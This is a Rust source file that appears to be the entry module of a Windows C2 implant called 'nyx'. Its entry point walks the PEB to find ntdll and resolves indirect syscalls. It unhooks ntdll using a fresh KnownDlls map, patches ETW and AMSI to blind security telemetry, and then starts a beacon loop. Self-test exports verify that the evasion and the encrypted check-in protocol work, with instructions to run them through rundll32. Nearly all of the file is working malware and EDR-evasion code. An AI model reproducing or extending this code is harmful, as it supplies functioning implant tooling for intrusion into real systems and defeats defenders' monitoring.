//! PIC entry point + task loop bootstrap.
//!
//! For a `cdylib`/shellcode implant the "entry" is an exported function the
//! loader calls (reflective DLL injection) or a thread the host spins up. It:
//!   1. locates ntdll + resolves the API set it needs (no allocation yet),
//!   2. the global allocator self-bootstraps on first `alloc`,
//!   3. runs the beacon loop: check-in → receive tasks → execute → repeat.
//!
//! All Windows-only. On the dev host this module is excluded by cfg.
//!
//! The real PIC extraction (Stardust-style sRDI) turns the cdylib into raw
//! position-independent shellcode whose first byte is the entry below. Until
//! that extraction step exists, the function is the reflective entry a
//! host-side loader calls after mapping the DLL.

#![cfg(target_os = "windows")]

use crate::resolve::LiveNtdll;

/// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
/// indirect-syscall runtime, then enters the beacon loop.
///
/// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
/// extraction marks as the entry point.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry() {
    // 1. PEB-walk ntdll + resolve the SSN table (validates resolve.rs).
    let Some(ntdll) = LiveNtdll::locate() else {
        core::hint::spin_loop();
        return;
    };
    let _ssn_table = ntdll.resolve_table_owned();

    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
    //    (now over a FRESH KnownDlls\ntdll map when available — defeats inline
    //    hooks; falls back to the hooked ntdll otherwise).
    let _syscall_rt = crate::syscalls::Runtime::init();

    // 3. Blind ETW (always present in ntdll) + best-effort AMSI (amsi.dll is
    //    usually not loaded yet; the beacon loop retries it each cycle). Done
    //    before any scanning-relevant action so telemetry is neutralized early.
    let _ = crate::blind::patch_etw();
    let _ = crate::blind::patch_amsi();

    // 4. Enter the beacon loop (WinHTTP check-in + task loop).
    crate::beacon::beacon_loop();
}

/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
/// table, and exits the process with a code reporting the result:
///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
///   - exit code = 0xFFFFFFFF = ntdll could not be located
///
/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
/// table → SSN resolution) on a real Windows host without any network activity
/// or persistence — a benign closed-loop check.
/// Exit with `code` via the resolved ExitProcess; traps if unavailable.
unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
    if let Some(e) = exit_proc {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
        f(code);
    }
    loop { core::hint::spin_loop(); }
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // === Phase 1: PEB walk + export table (no alloc) ===
    // Exit 0x600 + N (N = ntdll named export count, ~2365 on Win2019).
    let base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let opt = base.add(e_lfanew + 24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    let _n_names: u32 = if export_rva != 0 {
        let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
        (*dir).number_of_names
    } else { 0 };

    // === Phase 2: SSN resolution (allocates) ===
    // Exit 0x100 + N (N = resolved SSN count). Proves allocator + Hell/Halo/Tartarus.
    crate::ntalloc::force_resolve();
    let ntdll = match LiveNtdll::locate() {
        Some(n) => n,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let table = ntdll.resolve_table_owned();
    let _ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count();

    // === Phase 3: protocol crypto round-trip (no network) ===
    // Exit 0xE01 = success; 0xE00 = failure.
    let ikp = nyx_protocol::ImplantKeypair::generate();
    let dummy_server_pub = [0x42u8; 32];
    let key = ikp.session_key(&dummy_server_pub);
    let pubkey = ikp.public_bytes();
    let plaintext = b"check-in-test-payload";
    let frame = nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext);
    let raw = match nyx_protocol::parse_frame(&frame) {
        Ok(r) => r,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    let decoded = match nyx_protocol::open_frame(&key, &raw) {
        Ok(p) => p,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    if decoded.as_slice() != plaintext.as_slice() {
        report_exit(exit_proc, 0xE00);
    }
    // 0xE01: crypto round-trip OK. If an echo server is listening on 8443,
    // continue to the transport test; otherwise report success and exit.
    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
    match crate::transport::post_frame(b"127.0.0.1", 8443, b"/beacon", &payload) {
        Some(resp) => {
            if resp.len() == payload.len() && resp.as_slice() == payload.as_slice() {
                report_exit(exit_proc, 0xF07); // transport + crypto both OK
            } else {
                report_exit(exit_proc, 0xF08); // transport OK but mismatch
            }
        }
        None => report_exit(exit_proc, 0xE01), // no echo server; crypto alone OK
    }
}

/// **Evasion self-test entry** (benign validation of the unhook + blind tracks).
///
/// Runs Phase 4 (NTDLL fresh-map diff) and Phase 5 (AMSI/ETW blind byte-verify)
/// and exits with a single code encoding both results, so an operator gets one
/// observable number for the evasion state on a real host:
///
/// - Phase 4 (unhook): `0x0400 + D` where `D` = bytes differing between the
///   fresh KnownDlls ntdll `.text` and the in-process (hooked) ntdll `.text`.
///   `D == 0` means the host's ntdll was clean (fresh-map is a no-op but
///   proved functional); `D > 0` means it WAS hooked and the fresh map gave us
///   pristine bytes. `0x0FFF` = fresh map itself failed (KnownDlls unavailable).
/// - Phase 5 (blind): `0x0500 | mask` where mask bit0 = ETW patched &
///   byte-verified, bit1 = AMSI patched & byte-verified, bit2 = amsi.dll was
///   present at selftest time.
///
/// The combined exit code is `0x0400 + D` if the fresh map worked, else falls
/// through to Phase 5's code. To read each independently, run with the host in
/// different states (e.g. under an EDR for D>0). Invoke via
/// `rundll32 nyx_implant_win.dll,nyx_selftest_evasion`.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_evasion() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // Bootstrap the allocator (Phase 2 of the main selftest does this; we need
    // it for the fresh-map's Vec materialization).
    crate::ntalloc::force_resolve();

    // === Phase 4: NTDLL fresh-map unhook diff ===
    let hooked_base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    match crate::unhook::fresh_ntdll_text() {
        Some((fresh_base, text_rva, text_size)) => {
            let diffs = crate::unhook::text_diff_count(fresh_base, hooked_base, text_rva, text_size);
            crate::unhook::unmap_fresh(fresh_base); // RAII not available across the match
            // Report 0x0400 + D (cap D at 0x3FF to stay in the 0x04XX band).
            let code = 0x0400 + (diffs.min(0x3FF) as u32);
            report_exit(exit_proc, code);
        }
        None => {
            // Fresh map failed (KnownDlls ACL / low IL). Fall through to Phase 5
            // so we still get the blind result. (The unhook-failure case is
            // observable as the absence of a 0x04XX exit: if we reach Phase 5,
            // the fresh map didn't succeed.)
        }
    }

    // === Phase 5: AMSI/ETW blind byte-verify ===
    // Patch ETW (always present) + AMSI (best-effort), then re-read the first
    // bytes and compare to the patch to PROVE the write landed.
    let _ = crate::blind::patch_etw();
    let amsi_attempted = crate::blind::patch_amsi().is_ok();

    let mut mask: u32 = 0;
    // ETW byte-verify.
    if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"EtwEventWrite") {
        if crate::blind::already_patched(addr, &crate::blind::ETW_PATCH) {
            mask |= 0x1;
        }
    }
    // AMSI byte-verify (only if amsi.dll was loaded).
    if amsi_attempted {
        mask |= 0x4; // amsi.dll was present
        if let Some(addr) = crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer") {
            if crate::blind::already_patched(addr, &crate::blind::AMSI_PATCH) {
                mask |= 0x2;
            }
        }
    }
    report_exit(exit_proc, 0x0500 | mask);
}
